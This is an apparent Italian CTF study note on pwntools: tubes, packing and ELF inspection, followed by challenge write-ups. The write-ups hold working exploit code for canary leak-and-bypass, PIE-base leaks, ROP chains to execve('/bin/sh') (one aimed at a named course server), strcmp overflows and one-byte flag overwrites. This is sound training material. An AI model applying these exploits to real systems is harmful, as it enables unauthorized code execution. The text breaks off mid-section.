---
title: pwntools
tags:
  - cyberbootcamp
  - concetto
  - pwn
  - tools
---

# pwntools

> [!abstract] A cosa serve pwntools
> Quando usi un programma dal terminale, riconosci il prompt, scrivi una risposta e premi Invio. Con pwntools puoi descrivere lo stesso dialogo in Python e verificare i byte scambiati a ogni passaggio. Nella [[04 - CB - Binary Exploitation 1|lezione 4]] la libreria serve anche a leggere le proprietà dei binari ELF.

[[#Mappa della documentazione di pwntools|Mappa dei moduli]] · [[#Indice dei metodi e delle funzioni|Indice delle API]]

## Un primo dialogo con un processo

Un *tube* è il canale attraverso cui uno script legge e scrive byte. Con `process(...)` il canale comunica con un programma avviato sul computer. Con `remote(host, port)` comunica con un servizio di rete. I metodi di lettura e scrittura sono gli stessi. [Documentazione dei tube](https://docs.pwntools.com/en/stable/tubes.html)

L'esempio avvia un secondo interprete Python che chiede un nome e stampa un saluto. Puoi eseguirlo con pwntools installato, senza compilare un binario.

```python
import sys
from pwn import process

programma = 'nome = input("Nome? "); print("Ciao, " + nome)'
with process([sys.executable, "-u", "-c", programma]) as io:
    prompt = io.recvuntil(b"? ")
    io.sendline(b"Ada")
    risposta = io.recvline()
    assert prompt == b"Nome? "
    assert risposta == b"Ciao, Ada\n"
```

Il prompt termina con uno spazio. Una `recvline()` in quel punto aspetterebbe un fine riga mentre il programma aspetta il nome. Dopo il prompt, `sendline` aggiunge il byte di fine riga che conclude l'input. L'ultima lettura trova il saluto completo perché `print` termina la risposta con `\n`.

## Prontuario di lettura e scrittura

| Cosa prevede il formato del messaggio? | Metodo | Comportamento |
|---|---|---|
| Un blocco di lunghezza variabile | `io.recv(32)` | Legge fino a 32 byte. Può restituirne meno appena ci sono dati. |
| Un campo lungo esattamente 4 byte | `io.recvn(4)` | Accumula i byte fino a completare il campo. |
| Una riga di testo | `io.recvline()` | Legge fino al fine riga e lo include nel risultato. |
| Un prompt riconoscibile | `io.recvuntil(b"> ")` | Consuma i dati fino alla **prima** occorrenza del delimitatore, inclusa. Con `drop=True` lo omette dal risultato. |
| Un campo binario da inviare | `io.send(dati)` | Scrive i byte forniti. |
| Una risposta da confermare con Invio | `io.sendline(dati)` | Scrive i byte e aggiunge il fine riga configurato. |

> [!tip] Quando una lettura sembra bloccata
> Con `io.recvuntil(b"> ", timeout=2)`, un risultato `b""` indica che il delimitatore non è arrivato entro due secondi. I byte già raccolti restano nel buffer. Se il canale si chiude prima del delimitatore, la chiamata solleva `EOFError`. Controlla spazi e fine riga con `repr(dati)` quando ispezioni una risposta. [Riferimento di recvuntil](https://docs.pwntools.com/en/stable/tubes.html#pwnlib.tubes.tube.tube.recvuntil)

> [!warning] Il delimitatore deve essere unico
> `recvuntil` si ferma alla **prima** occorrenza e lascia il resto nel buffer. Con il messaggio `Challenge 1: ...\nEnter a key (hex): `, la chiamata `recvuntil(b":")` si ferma dopo `Challenge 1:`, e la `recvline()` successiva restituisce l'avanzo della stessa riga invece del dato atteso. Usa un pezzo di prompt che compare una volta sola, come `b"(hex): "`, oppure `sendlineafter(b"(hex): ", dati)`, che aspetta il prompt e poi invia. Caso reale in [[pycryptodome#GuessThePlaintext · AES in ECB, CBC e CTR con chiave scelta da te|GuessThePlaintext]].

## Testo, byte e interi

Il numero dodici può viaggiare come testo oppure come campo binario. Nel primo caso `b"12"` contiene due byte, `31 32` in esadecimale, uno per cifra. Nel secondo caso il formato stabilisce quanti byte occupa l'intero e in quale ordine leggerli. Per il testo usa `.encode("utf-8")` in invio e `.decode("utf-8")` in lettura quando il protocollo specifica UTF-8.

```python
from pwn import p32, u32

campo = p32(12, endian="little")
assert campo.hex(" ") == "0c 00 00 00"
assert u32(campo, endian="little") == 12
assert p32(12, endian="big").hex(" ") == "00 00 00 0c"
```

> [!warning] Correzione
> Il numero nel nome della funzione indica la larghezza in **bit**. `p32` produce quattro byte e `p64` ne produce otto. L'ordine dipende da `context.endian` oppure dall'argomento esplicito. In *little-endian* il byte meno significativo viene per primo. [Documentazione del packing](https://docs.pwntools.com/en/stable/util/packing.html)

Nelle challenge crypto i valori arrivano spesso come **testo hex** in fondo a una riga (`Here's the nonce (hex): 8a2c878413511543`). Invece di contare i caratteri del prefisso per lo slice, prendi l'ultima parola e convertila in byte veri:

```python
riga  = io.recvline()                       # b"Here's the nonce (hex): 8a2c878413511543\n"
nonce = bytes.fromhex(riga.split()[-1].decode())
assert nonce == b"\x8a\x2c\x87\x84\x13\x51\x15\x43"
```

Nella direzione opposta `chiave.hex().encode()` prepara una chiave da mandare in hex. Le tre forme (testo hex, `str`, byte veri) e l'uso con AES sono in [[pycryptodome#Testo hex, `str` e byte veri|pycryptodome]].

## Leggere un binario ELF

ELF è il formato di molti eseguibili e librerie Linux. `ELF(percorso)` apre il file per ispezionarlo. L'oggetto espone `.arch` per l'architettura, `.bits` per la larghezza e `.endian` per l'ordine dei byte. L'attributo [[pwn-symbols|symbols]] associa i nomi dei simboli disponibili ai loro indirizzi. Un eseguibile privato dei simboli di debug e della tabella dei simboli ordinaria può conservare alcuni simboli dinamici.

```python
from pwn import ELF, context

binario = ELF("/bin/ls", checksec=False)
context.binary = binario
print(binario.arch, binario.bits, binario.endian)
```

L'assegnazione a `context.binary` configura pwntools secondo le proprietà del file. Il programma viene avviato solo quando lo script chiama `process`.

## Funzioni usate nelle challenge

### OnlyAString · Dove finisce pwntools e dove inizia il C

Nel passaggio dal canale a una funzione C si incontrano tre tipi di dato. `recvline()` consegna un oggetto `bytes`. `bytearray(dati)` crea una copia modificabile e permette di applicare XOR ai singoli byte. `ctypes.CDLL(...)`, dalla libreria standard Python, carica la libreria condivisa che esegue l'elaborazione in C.

> [!warning] Correzione
> In `ctypes`, `argtypes` descrive i parametri della funzione C e `restype` descrive il valore restituito. Il tipo di ritorno predefinito è `c_int`. Per un buffer binario occorre conoscere anche la lunghezza. Un byte zero può appartenere ai dati. In C, `memcpy` copia il numero di byte indicato e richiede che i due buffer abbiano spazio sufficiente e non si sovrappongano.

### CatDashboard · Stato e riproducibilità

`srand(seed)` inizializza lo stato del generatore della libreria C. Nella stessa implementazione, ripetere il seed e la sequenza di chiamate a `rand()` riproduce i risultati. Questo permette di rendere ripetibile un test. Un seed derivato dall'orario rende la sequenza prevedibile e quindi inadatta a generare segreti. Qui pwntools gestisce il processo e i suoi dati, mentre il generatore appartiene alla libreria C.

### Csaw · Catena ROP con 5 argomenti e stringhe già presenti nel binario

La funzione target, `csaw()`, richiede 5 argomenti `char*` (puntatori a stringa), seguendo la [[Calling Convention|calling convention]] x86-64: 1° argomento in `rdi`, 2° in `rsi`, 3° in `rdx`, 4° in `rcx`, 5° in `r8`. Il binario non aveva un gadget "comodo" `pop rdi; ret` per ogni singolo registro: enumerando `rop.gadgets` (il dizionario `{indirizzo: Gadget}` che elenca tutti i gadget che pwntools riconosce, vedi [[pwn-ROP]]) sono emersi due gadget "combinati" che riempiono più registri in sequenza: `pop rdi; pop rsi; pop rdx; ret` e `pop rcx; pop r8; ret`. Mettendo questi due gadget nella catena, seguiti ciascuno dai valori nell'ordine in cui i `pop` li consumano, si passano tutti e 5 gli argomenti con una sola coppia di gadget invece di cinque gadget singoli.

Il binario è **No PIE**, quindi gli indirizzi di `.rodata` (i dati costanti) sono fissi e identici a ogni esecuzione, anche da remoto. Le 5 stringhe richieste da `csaw()` erano già presenti in `.rodata` (visibili anche in IDA), quindi non è stato necessario scriverle a mano: `exe.search(b"MIGLIORI")` restituisce un **generatore** con tutti gli indirizzi dove quella sequenza di byte compare nel binario, e `next(...)` ne prende il primo.

> [!warning] Correzione
> Il primo tentativo metteva nel payload i byte letterali delle stringhe (`b"MIGLIORI"`) subito dopo i gadget `pop`, al posto dei loro indirizzi. `csaw()` si aspetta un **indirizzo** (un `char*`, cioè un numero che punta a dove, in memoria, inizia il testo), non il testo stesso: un registro riempito con gli 8 byte ASCII di `"MIGLIORI"` non punta da nessuna parte di valido, e la funzione crasha appena prova a leggere la stringa a quell'indirizzo inesistente (connessione chiusa con `EOFError`). La correzione è stata avvolgere ogni indirizzo trovato con `exe.search()` in `p64(...)`, come con qualsiasi altro indirizzo in una catena ROP.

Se le stringhe non fossero già esistite nel binario, l'alternativa sarebbe stata scriverle in un punto di memoria a indirizzo fisso e noto (es. la `.bss`, anch'essa non randomizzata in un binario No PIE) tramite una catena ROP che richiama una funzione di lettura con destinazione controllata — lo stack stesso non va bene per questo, perché il suo indirizzo base resta randomizzato dall'ASLR del kernel anche quando il binario è No PIE.

Questa tecnica (un ROP "in due tempi" dentro la stessa catena) userebbe una funzione di lettura già collegata nel binario (es. `read()`) come **primitivo di scrittura**: prima una parte della catena la richiama con `rdi` = descrittore di input, `rsi` = indirizzo `.bss`, `rdx` = quanti byte aspettarsi; subito dopo, nella stessa catena, i pop per la funzione finale usano quello stesso indirizzo `.bss` come argomento. L'indirizzo è noto subito (`exe.bss()` lo legge dall'ELF, è una costante), quindi si può scrivere `p64(bss)` anche prima che `read()` venga davvero eseguita: Python sta solo componendo byte, non eseguendo nulla.

Ciò che cambia è **come si inviano i dati dallo script**: il payload di overflow e il contenuto che `read()` leggerà sono due invii distinti, in sequenza, sullo stesso canale:

```python
bss = exe.bss(0)          # indirizzo fisso della .bss (No PIE)
testo = b"MIGLIORI\0"     # ciò che deve finire lì, terminato da \0

payload  = b"A"*offset_data + b"B"*size_rbp
payload += p64(pop_rdi_rsi) + p64(0) + p64(bss)   # prepara read(0, bss, ...)
payload += p64(exe.symbols["read"])
payload += p64(pop_rdi) + p64(bss)                 # poi csaw(bss, ...)
payload += target_function

p.sendline(payload)   # 1. overflow + catena ROP
p.send(testo)          # 2. i byte che read() leggerà dentro .bss
```

L'ordine conta: il programma esegue `fgets`, riceve il payload, poi la catena arriva a `read()`, che si blocca aspettando altri byte dal socket — esattamente quelli del secondo `p.send(testo)`, mandato subito dopo sullo stesso canale TCP.

### EngineeringDegree · Leak del canary e bypass in due letture

Obiettivo: raggiungere `win()` da una funzione `degree()` vulnerabile, ma con lo **stack canary** attivo (vedi [[Canary dello Stack]]). Il canary è un valore casuale che il compilatore mette tra il buffer e l'indirizzo di ritorno; alla fine della funzione lo riconfronta con la copia sicura in `fs:0x28`, e se non combacia chiama `__stack_chk_fail` (abort). Un overflow "ingenuo" non basta, perché per raggiungere il return address deve passare sopra il canary e corromperlo.

La funzione fa due letture. L'attacco sfrutta due debolezze insieme:

1. **Leak**: il primo byte del canary è sempre `\x00` (protezione voluta, blocca la lettura con funzioni che si fermano al null byte). La prima lettura riempie il buffer e **sovrascrive solo quel byte nullo** con un carattere qualsiasi (es. `G`): la successiva `printf("Hey %s...")` non si ferma più lì e **stampa** anche i 7 byte restanti del canary. Da quei 7 byte si ricostruisce il valore intero con `u64(b"\x00" + sette_byte)` (si rimette davanti lo `\x00` che era stato cancellato).
2. **Resend**: il controllo verifica solo che il canary sia *uguale*, non che non sia stato toccato. La seconda lettura rifà l'overflow, ma stavolta rimette **esattamente il canary leakato** nella sua posizione, e dopo (saved rbp + gadget `ret` per l'allineamento a 16B + indirizzo di `win`) sovrascrive il return address. Il controllo passa, la funzione fa `ret` e salta a `win()`.

```python
# --- leak ---
payload = b"D"*40 + b"G"          # G cancella lo \x00 del canary
p.recvuntil(b">")                 # consuma il prompt rimasto nel buffer
leak = p.recvline()
canary = u64(b"\x00" + leak[45:52])   # 7 byte reali + \x00 davanti
# --- exploit ---
payload2 = b"D"*40 + p64(canary) + b"B"*8 + p64(ret) + p64(win)
p.recvuntil(b">")
p.sendline(payload2)
```

> [!warning] Correzione · lo slice dipende da dove inizia davvero `leak`
> `recvline()` restituisce **i byte rimasti nel buffer da una lettura precedente + i nuovi**. Un prompt (`>`) non consumato dalla lettura prima resta nel buffer e finisce in testa al risultato: `leak` iniziava con `">Hey..."` invece di `"Hey..."`, spostando di 1 ogni offset e facendo prendere allo slice `[45:52]` la `G` + 6 byte di canary invece dei 7 byte veri. La soluzione è un `recvuntil(b">")` che svuota il prompt prima del leak, così `leak` inizia dove ci si aspetta.

> [!warning] Correzione · il payload va ricostruito pulito
> Riusare la stessa variabile `payload` per il secondo invio si trascinava dietro la `G`, disallineando il canary di 1 byte e facendo fallire il controllo. Attenzione a un refuso insidioso: `paylaod = data_padding` (con `a` e `o` invertite) in Python **non dà errore** — crea silenziosamente una variabile nuova, mentre il vero `payload` resta invariato. Quando "la logica è giusta ma il risultato no", controllare i nomi delle variabili lettera per lettera è tra i primi sospetti.

> [!warning] Correzione · deadlock di `recvline()`
> Dopo il leak, il programma stampa `"...name?>"` (senza newline) ed entra subito nella seconda `read`, bloccandosi in attesa di input. Una `recvline()` lì si blocca a sua volta, perché aspetta un `\n` che non arriverà mai finché non inviamo il payload → stallo. Quando il programma attende input senza aver mandato un a-capo, si usa `recvuntil` sul prompt (o si invia direttamente), non `recvline`.

> [!tip] Debug sotto pwndbg con pwntools
> Per ispezionare lo stack mentre l'exploit gira in locale, invece di `process(...)` + `gdb.attach(...)` (soggetto a *race condition*: il programma può superare il breakpoint prima che GDB si agganci) conviene `gdb.debug(...)`, che avvia il programma già fermo sotto GDB. Serve configurare:
> ```python
> context.terminal = ['tmux', 'splitw', '-v']   # dove aprire la finestra di GDB (dentro una sessione tmux)
> context.gdb_binary = 'pwndbg'                  # usa pwndbg al posto di gdb/GEF
> p = gdb.debug("./bin", gdbscript='''
> break degree
> continue
> ''')
> ```
> `gdb.debug` richiede il pacchetto **`gdbserver`** (`sudo dnf install gdb-gdbserver` su Fedora). Comandi utili dentro pwndbg: `canary` (valore del canary del processo), `stack 20` / `telescope $rsp 20` (stack con dereferencing automatico). La notazione `◂—` si legge "l'indirizzo a sinistra contiene il valore a destra". Il binario non strippato (`Stripped: No`) permette `break <nome_funzione>` senza calcolare indirizzi a mano.

### GrandmasCake · Leak del return address per battere il PIE e ROP a `execve`

Obiettivo: ottenere una shell con `execve("/bin/sh", NULL, NULL)` su un binario con **PIE** e **NX** attivi ma **senza canary**. Servono due cose in sequenza: (1) un **leak** per ricavare la base del PIE (vedi [[PIE]]), (2) una catena **ROP** (vedi [[ROP]]) che prepara i registri della syscall e la invoca. Il binario regala i gadget utili in una funzione `usefull` (prologo normale seguito da `pop rax; pop rdx; retn`, che la `sp-analysis failed` di IDA tradisce come "finta funzione"): enumerando `rop.gadgets` emergono `pop rax; pop rdx; ret`, `pop rdi; pop r13; pop rsi; ret` e un `syscall` isolato.

**Fase 1 — leak via `printf("...%s...", buf)`.** La `granny()` vulnerabile legge in `char buf[16]` (a `rbp-0x10`) con `read(0, buf, 0x50)`: 80 byte in un buffer da 16, quindi *buffer overflow*. Poco dopo stampa `buf` con `%s`. Il punto chiave è che **`%s` stampa fino al primo `\x00`**: per leakare oltre il buffer non deve esserci un null byte lungo la strada. Riempiendo 24 byte non-nulli — `strawberry` (richiesto dal controllo sul flavor) + 6 di padding per completare `buf` + 8 che calpestano il `saved rbp` — si tolgono di mezzo gli `\x00` del saved rbp e `%s` prosegue fino al **return address**, che resta intatto.

Quel return address è l'istruzione **successiva** alla `call granny` (`0x1372`, non `0x136D` della call stessa): `call` mette sullo stack l'indirizzo di ritorno = istruzione dopo. Inizia con `0x55…`, firma di un indirizzo di codice PIE. Da qui si ricava la base:

```python
p.recvuntil(b">")
p.send(b"strawberry" + b"P"*6 + b"B"*8)   # 24 byte: riempie buf (16) + saved rbp (8)
leak = p.recvuntil(b">")
ret_leak = u64(leak[57:63].ljust(8, b"\x00"))   # 6 byte reali + 2 \x00 per arrivare a 8
pie_base = ret_leak - 0x1372                      # offset del return address in IDA
exe.address = pie_base                            # riallinea tutto il binario
```

Lo slice `[57:63]` isola i 6 byte dell'indirizzo: 33 (`"How lucky! I happen to have some "`) + 10 (`strawberry`) + 6 (`P`) + 8 (`B`) = 57.

> [!warning] Correzione · il null byte **ferma** `%s`, non lo abilita
> Il primo tentativo inviava `strawberry` + un null byte per "chiudere" la stringa: ma quel `\x00` è esattamente ciò che interrompe `%s`, e il leak restituiva solo `"strawberry"`. Per leggere saved rbp e return address serve l'**opposto**: nessun `\x00`, e padding non-nullo fin sopra i valori da leakare. Un indirizzo userspace Linux a 64 bit ha gli ultimi 2 byte a zero (`0x0000xxxxxxxxxxxx`), quindi `%s` ne restituisce solo i 6 byte bassi: si ricompone a 8 con `.ljust(8, b"\x00")` prima di `u64`.

> [!warning] Correzione · si leaka la **base**, non "l'offset"
> Equivoco ricorrente: chiamare `pie_base` "l'offset dovuto al PIE". Nella formula `indirizzo reale = base + offset` l'*offset* è la distanza **fissa** di un simbolo (letta in IDA: `0x1372`, `0x11f8`, …) e non cambia mai; la **base** è dove il binario viene caricato stavolta e cambia a ogni esecuzione. Per un PIE la base coincide numericamente con lo *scorrimento* ASLR (nel file gli indirizzi partono da 0), e questo spiega l'equivoco — ma `exe.address` si aspetta la **base**, da tenere distinta dagli offset dei simboli.

**Fase 2 — ROP a `execve` (syscall 59).** Convenzione delle syscall Linux x86-64 (vedi [[Calling Convention]]): numero in `rax`, argomenti in `rdi, rsi, rdx, r10, r8, r9`. Per `execve(pathname, argv, envp)` servono `rax=59`, `rdi=&"/bin/sh"`, `rsi=0`, `rdx=0`. I gadget a disposizione impongono l'ordine: `pop rdi; pop r13; pop rsi; ret` **consuma tre valori** (rdi, poi r13, poi rsi), quindi vanno fornite tre celle. Il `syscall` non è speciale: in una catena ROP ogni cella è un indirizzo di ritorno, quindi lo si mette come una qualsiasi, in coda, a registri pronti (è `['syscall']` senza `ret`, ma va bene come ultima tappa: se `execve` riesce sostituisce il processo). La stringa `/bin/sh` è già nel binario, in `.data`: `exe.search(b"/bin/sh\x00")` la trova da sola (dopo `exe.address`, restituisce l'indirizzo reale).

```python
rop = ROP(exe)
pop_rax_rdx     = pie_base + 0x11f1   # pop rax; pop rdx; ret
pop_rdi_r13_rsi = pie_base + 0x11f8   # pop rdi; pop r13; pop rsi; ret
syscall_gadget  = pie_base + 0x11fd   # syscall
binsh = next(exe.search(b"/bin/sh\x00"))

payload  = b"A"*16 + b"B"*8                                     # buf + saved rbp fino al ret
payload += p64(pop_rax_rdx) + p64(59) + p64(0)                 # rax=59 (execve), rdx=0 (envp)
payload += p64(pop_rdi_r13_rsi) + p64(binsh) + p64(0) + p64(0) # rdi=&/bin/sh, r13=junk, rsi=0
payload += p64(syscall_gadget)

p.sendline(payload)   # va alla seconda read(0x60); il flavor non è più ricontrollato
p.interactive()
```

> [!warning] Correzione · `rdi` vuole un **puntatore**, non la stringa — e attenzione a *dove* dentro la stringa
> Nel primo payload `rdi` riceveva i byte letterali `b"/bin/sh"`. Due errori in una riga: (1) un registro non "contiene" un file ma l'**indirizzo** dove la stringa sta in memoria → serve `p64(binsh)`; (2) `b"/bin/sh"` è lungo **7** byte, non 8, quindi sfasa l'intera catena da lì in poi (r13, rsi, syscall finirebbero disallineati). In più, in IDA il simbolo a `0x4010` è `'As per usual:/bin/sh\0'`: `"/bin/sh"` **non** inizia a `0x4010` ma dopo i 13 byte di `"As per usual:"`, cioè a `0x401D`. Puntare a `0x4010` chiederebbe a `execve` di eseguire un file chiamato `"As per usual:/bin/sh"`, inesistente. `exe.search(b"/bin/sh\x00")` restituisce direttamente `0x401D` (+ base), senza conteggi a mano.

> [!note] Perché il ROP via `ret` funziona nonostante SHSTK/IBT
> Il `checksec` segnala **IBT** e **SHSTK** abilitati. IBT (*Indirect Branch Tracking*) pretende un `endbr64` solo come bersaglio di `call`/`jmp` **indiretti**: il `ret` non è un salto indiretto, quindi la catena ROP non lo viola. SHSTK (*Shadow Stack*) invece rileverebbe la sovrascrittura del return address — se fosse davvero **imposto a runtime** da CPU + kernel + glibc. Un ROP classico che va a segno indica che lo shadow stack è marcato nel binario ma non attivo nell'ambiente di esecuzione.

### NotSoCleanROPPlayground · Gadget "sporchi" che toccano registri extra

Obiettivo: `execve("/bin/sh", NULL, NULL)` tramite **syscall** diretta su un binario **No PIE**, **No canary**, con **NX** attivo e **SHSTK/IBT** marcati nel checksec. Essendo No PIE, gli indirizzi sono fissi a ogni esecuzione: non serve alcun leak (a differenza di [[#GrandmasCake · Leak del return address per battere il PIE e ROP a `execve`|GrandmasCake]], dove il PIE costringeva a ricavare la base prima della catena).

Il "not so clean" del nome sta nei gadget disponibili: non ci sono i `pop rdi; ret` "puliti" (un pop per il registro che serve), ma gadget che **consumano più `pop` del necessario**, sporcando registri extra. Per usarli devi comunque fornire un valore per ogni `pop`, nell'ordine esatto in cui compaiono: i registri non voluti li riempi con valori di scarto (*junk*).

La [[Calling Convention|convenzione delle syscall]] Linux x86-64 vuole: numero in `rax`, argomenti in `rdi, rsi, rdx, r10, r8, r9`. Per `execve(pathname, argv, envp)` servono `rax=59`, `rdi=&"/bin/sh"`, `rsi=0` (argv), `rdx=0` (envp). I gadget scelti (indirizzi fissi, No PIE):

| Gadget | Indirizzo | Imposta | `pop` extra da riempire con junk |
|---|---|---|---|
| `pop rax; pop r14; pop rcx; ret` | `0x40117e` | `rax=59` | `r14`, `rcx` |
| `pop rdi; pop rcx; pop rdx; ret` | `0x401183` | `rdi=&/bin/sh`, **`rdx=0`** | `rcx` |
| `pop rsi; ret` | `0x401187` | `rsi=0` | — |
| `syscall` | `0x401189` | invoca la syscall | — |

Nota il colpo "furbo": il gadget per `rdi` ha un terzo `pop` verso `rdx`, quindi con lo stesso gadget si imposta anche `rdx=0` senza spendere un gadget dedicato. Per `rsi` invece c'era sia `pop rsi; pop rcx; ret` sia il più pulito `pop rsi; ret`: si sceglie il secondo, che non lascia da riempire.

La stringa `/bin/sh` è già nel binario, in `.data` a `0x404040`, dentro un messaggio più lungo: `'Same as last time, here you go:/bin/sh'`. Il `/` di `/bin/sh` inizia all'**offset 31** (i 31 byte di `"Same as last time, here you go:"`), quindi l'indirizzo esatto da passare a `rdi` è `0x404040 + 31`. Essendo No PIE, è una costante valida anche da remoto.

L'overflow: il buffer è 32 byte, seguiti da 8 byte di *saved rbp*; il return address viene subito dopo, quindi la catena parte a offset 40.

```python
bin_sh_addr = 0x404040 + 31        # indirizzo di "/bin/sh" dentro .data (No PIE: fisso)

rax         = 0x40117e             # pop rax; pop r14; pop rcx; ret
second_part = 0x401183             # pop rdi; pop rcx; pop rdx; ret
rsi         = 0x401187             # pop rsi; ret
scall       = 0x401189             # syscall

payload  = b"A"*32 + b"B"*8                      # buf (32) + saved rbp (8) fino al ret
payload += p64(rax) + p64(59) + p64(0) + p64(0)  # rax=59 (execve); r14, rcx = junk
payload += p64(second_part) + p64(bin_sh_addr) + p64(0) + p64(0)  # rdi=&/bin/sh; rcx=junk; rdx=0 (envp)
payload += p64(rsi) + p64(0)                     # rsi=0 (argv)
payload += p64(scall)                            # syscall -> execve

p = remote("cyberchallenge.diag.uniroma1.it", 5207)
p.recvuntil('>')
p.send(payload)
p.interactive()
```

> [!warning] Correzione · `p64` una volta sola
> Un primo tentativo definiva `bin_sh_addr = p64(0x404040 + 31)` (già impacchettato) e poi nella catena scriveva `p64(bin_sh_addr)`: un doppio `p64`. `p64` vuole un **intero** e restituisce `bytes`; passargli dei `bytes` è un errore. La regola: tieni gli indirizzi come **interi** nelle variabili e applica `p64` **una volta sola**, al momento di comporre il payload. (In questa challenge contava davvero: con indirizzi disallineati l'intera catena saltava.)

> [!warning] Correzione · ogni `pop` vuole una cella, anche quelli che non ti servono
> Con gadget "sporchi" l'errore tipico è contare solo i registri utili e dimenticare le celle per i `pop` extra. `pop rax; pop r14; pop rcx; ret` consuma **tre** valori dallo stack: se ne metti solo uno (per `rax`), i due `pop` successivi si mangiano l'indirizzo del gadget seguente e la catena si disallinea. Per ogni `pop` ci va una cella `p64(...)`, nell'ordine esatto delle istruzioni; i registri non voluti si riempiono con `p64(0)` (junk).

> [!note] Niente gadget di allineamento per la syscall
> Il dump dei gadget segnava `0x40101a ['ret']` come "MAYBE": è il classico `ret` per riallineare `RSP` a 16 byte. Qui **non serve**, perché l'allineamento a 16 byte lo pretende `movaps` dentro le funzioni di libc (es. `system`), non l'istruzione `syscall`, che passa direttamente al kernel. Stesso motivo per cui funziona nonostante **SHSTK/IBT**: `ret` non è un salto indiretto (non viola IBT) e lo shadow stack risulta marcato nel binario ma non imposto a runtime (vedi la nota analoga in [[#GrandmasCake · Leak del return address per battere il PIE e ROP a `execve`|GrandmasCake]]).

### OTPOverflow · Overflow "corto" e confronto di stringhe con `strcmp`

Obiettivo: superare un controllo `strcmp(user_password, otp_password) == 0` **senza conoscere** l'OTP, che è generato casualmente a ogni esecuzione. Il binario ha il **canary** attivo, ma qui non si tocca: la vulnerabilità è un overflow *corto*, che non arriva nemmeno al canary.

Lo stack di `main` (letto in IDA) tiene due buffer **contigui** e, più in alto, il canary:

| Variabile | Offset da `rbp` | Dimensione |
|---|---|---|
| `user_password` | `rbp-0x50` | 32 byte |
| `otp_password` | `rbp-0x30` | 32 byte (più 8 di padding verso il canary) |
| canary | `rbp-0x8` | 8 byte |

Essendo adiacenti, l'inizio di `otp_password` è esattamente a **32 byte** dall'inizio di `user_password`: il 33° byte scritto in `user_password` *è* `otp_password[0]`.

La falla è in `fgets(user_password, 50, stdin)`: `fgets` scrive fino a **50** byte (49 caratteri + il terminatore `\0`) in un buffer di soli 32 → *buffer overflow* di `50 - 32 = 18` byte dentro `otp_password` (gli offset 0..17). Non controlli tutto l'OTP, solo i suoi primi 18 byte — e tanto basta.

Il punto chiave è **come** confronta `strcmp`: opera su *stringhe C*, cioè si ferma al primo byte `\0` (vedi la regola "parametro di lunghezza sì/no" nella sezione [[#Testo, byte e interi|tipi]] e in [[#NotSoCleanROPPlayground · Gadget "sporchi" che toccano registri extra|poco sopra]]). Quindi non serve far combaciare tutti e 32 i byte: basta che le due stringhe **coincidano fino a un `\0` che decidi tu**. E `fgets` si ferma solo sul newline, non sui `\0`, quindi con `send` di pwntools puoi piazzare un `\x00` dove vuoi.

La soluzione: scrivi **la stessa stringa null-terminata** due volte — all'inizio (→ `user_password`) e a offset 32 (→ `otp_password`). Entrambe, lette come stringa, valgono lo stesso testo; la coda casuale dell'OTP resta *dopo* il `\0` e `strcmp` non la guarda mai.

```python
datasize   = 32          # dimensione di user_password
maxbofsize = 50          # quanto scrive fgets (49 + \0)
control    = maxbofsize - datasize   # 18 byte che sbordano nell'OTP

meme = b"QUALUNQUE_STRINGA" + b"\x00"   # 17 caratteri + \0 = 18 byte (= control)
pad  = b"P" * (datasize - control)      # 14 byte: riempie fino a offset 32

payload = meme + pad + meme             # 18 + 14 + 18 = 50 byte
# user_password -> "QUALUNQUE_STRINGA" (si ferma al \0 a offset 17)
# otp_password  -> "QUALUNQUE_STRINGA" (seconda copia, \0 a offset 32+17)

p = remote("host", porta)
p.send(payload)        # niente sendline: il \n diventerebbe un \0 di troppo
p.interactive()
```

Il contenuto della stringa è irrilevante (viene confrontata solo con se stessa): conta la **lunghezza** + il `\0`, perché la seconda copia deve iniziare esattamente a offset 32.

> [!note] Leggere lo stack layout in IDA, senza farsi ingannare
> Due trappole di lettura incontrate qui: (1) `__int64` / `_QWORD` sono **8 byte** (il numero nel tipo è in *bit*: 64 bit), non 4 — `DWORD` è quello da 4; un buffer che IDA spezza in `char[8]` + tre `__int64` è un'unica area **contigua** da 32 byte. (2) IDA dimensiona una variabile-array sullo stack fino alla **prossima variabile definita**: `otp_password` risultava `[40]` perché tra esso (`rbp-0x30`) e il canary (`rbp-0x8`) ci sono `0x28 = 40` byte, di cui 8 di padding di allineamento. Per l'exploit contano gli **offset**, non l'etichetta `[32]`/`[40]`.

> [!tip] `fgets` e il byte nullo
> `fgets(buf, n, stream)` legge al massimo `n-1` byte, si ferma sul **newline** (che include) o su EOF, e aggiunge sempre un `\0`. Non si ferma sui `\x00` nei dati: puoi inviarne quanti vuoi con `p.send(...)`. Per questo si usa `send` e non `sendline`: un `\n` finale verrebbe convertito in `\0` da `user_password[strcspn(..., "\n")] = 0` e sposterebbe il terminatore.

### pleaselogin · Overflow di 1 byte su un flag adiacente (nessuna mitigazione toccata)

Obiettivo: ottenere la flag facendosi passare per **admin**, su un binario con **tutte** le protezioni attive — Full RELRO, canary, NX, PIE, SHSTK/IBT. Nessuna di queste viene scalfita: la falla è un overflow di **un solo byte** che cade su una variabile-flag adiacente. È l'esempio perfetto che "mitigazioni tutte verdi" ≠ "binario sicuro".

Nello stack di `main` c'è una `struct user_struct { char username[32]; char password[32]; }` tenuta **inline** (IDA la tipizza come `struct user_struct *`, ma `&UserStruct` è l'indirizzo del buffer stesso, a `rbp-0x90`; i vari `var_88…var_58` che il decompiler mostra sono i 64 byte della struct spezzati in qword — applicando il tipo struct spariscono). Subito dopo la struct c'è il flag che decide tutto:

```
rbp-0x90  username[32]
rbp-0x70  password[32]
rbp-0x50  v19   ← flag "sei admin"   (case 3: if (v19 != 0) → apre flag.txt e la stampa)
rbp-0x40  returned_flag[40]
rbp-0x18  canary
```

La struct è `0x90 - 0x50 = 0x40 = 64` byte (`32 + 32`): `v19` è **esattamente il byte dopo `password`**, non "lontano".

La falla è in `ins_password`: `read(0, password, 33)` scrive **33** byte in un `password` da **32**. In indici: `password[0]` a `rbp-0x70`, `password[31]` a `rbp-0x51` (ultimo byte legittimo), e `password[32]` a `rbp-0x50` = **`v19`**. Il 33° byte è un overflow mirato sul flag admin — per questo la `read` è da 33 e non da 32.

Resta lo scoglio della ripulitura del newline. `ins_password` fa:

```c
len = read(0, password, 33);
if (password[len] == '\n') { password[len-1] = 0; }   // ripulisce il \n
else { do c = getchar(); while (c != '\n'); }          // svuota stdin, NON scrive \0
```

